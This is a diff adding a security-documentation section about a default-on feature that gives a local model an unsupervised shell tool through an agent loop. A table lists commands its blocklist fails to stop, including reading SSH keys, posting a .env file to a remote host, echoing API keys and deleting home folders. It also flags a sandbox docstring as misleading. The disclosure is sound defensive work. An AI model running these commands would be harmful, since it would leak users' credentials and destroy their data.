@@ -239,6 +239,59 @@ When llm-router maintainers report a security vulnerability:
 - ✅ Credit responsible disclosures (unless requested otherwise)
 - ✅ Post security advisories publicly after patches are available
 
+## LLM_ROUTER_DIRECT_EXECUTION — what it actually grants
+
+**Default: on.** With it enabled, `hooks/auto-route.py` attempts to answer a prompt
+locally before Claude Code sees it. For prompts it classifies as needing file work, it
+runs a tool-calling agent loop (`hooks/agent_loop.py`) that hands the local model
+`write_file`, `edit_file` and `run_command` — the last via `subprocess.run(cmd,
+shell=True, ...)` — unsupervised, with no confirmation step, up to 15 iterations.
+
+### What is actually enforced
+
+- File-path operations are confined to the project root. This works as described.
+- `run_command` is filtered by `_BLOCKED_COMMANDS`, a regex over a handful of
+  top-level destructive patterns.
+
+### What that filter does NOT cover — measured against 13.0.1, not estimated
+
+Of twelve representative commands, **three** are blocked:
+
+| command | blocked |
+|---|---|
+| `rm -rf /`, `bash -c 'rm -rf /'`, `rm  -rf  /` | ✅ |
+| `rm -rf ./src` — targeted delete inside the project | ❌ |
+| `rm -rf $HOME/Documents` — home via shell expansion | ❌ |
+| `git push --force origin main` | ❌ |
+| `git reset --hard HEAD~5` | ❌ |
+| `npm install <anything>` / `pip install <anything>` | ❌ |
+| `cat ../../.ssh/id_rsa` — read outside the project | ❌ |
+| `curl -X POST https://… -d @.env` — exfiltrate secrets | ❌ |
+| `echo $LLM_ROUTER_API_KEY` / `echo $OPENAI_API_KEY` | ❌ |
+
+The blocklist stops catastrophic *system* damage. It does not stop project damage,
+credential disclosure, or network exfiltration.
+
+### A safety claim in the code that does not hold
+
+`agent_loop.py`'s module docstring states *"All file operations are sandboxed to the
+project directory."* That is true of `write_file`/`edit_file` and **false in effect**,
+because `run_command` runs an arbitrary shell string: `cat ../../.ssh/id_rsa` is not a
+"file operation" the sandbox sees. A reader forms a guarantee the code does not provide.
+
+### Should it default to on?
+
+Stated as a judgement, not a fact: **probably not, in this shape.** A default-on feature
+that grants unsupervised shell to a local model is a larger grant than "route my prompts
+cheaply" implies, and a user who never opts in has no reason to expect it. The
+conservative alternatives are (a) default the agent loop off while leaving read-only
+direct execution on, or (b) keep it on but drop `run_command` from the default tool set.
+
+This entry documents the current state rather than changing it — a default change needs
+its own decision and its own release note, not a drive-by.
+
+Disable with `LLM_ROUTER_DIRECT_EXECUTION=false`.
+
 ## Known Limitations
 
 - **SQLite concurrency:** Not suitable for teams (use Redis backend instead)
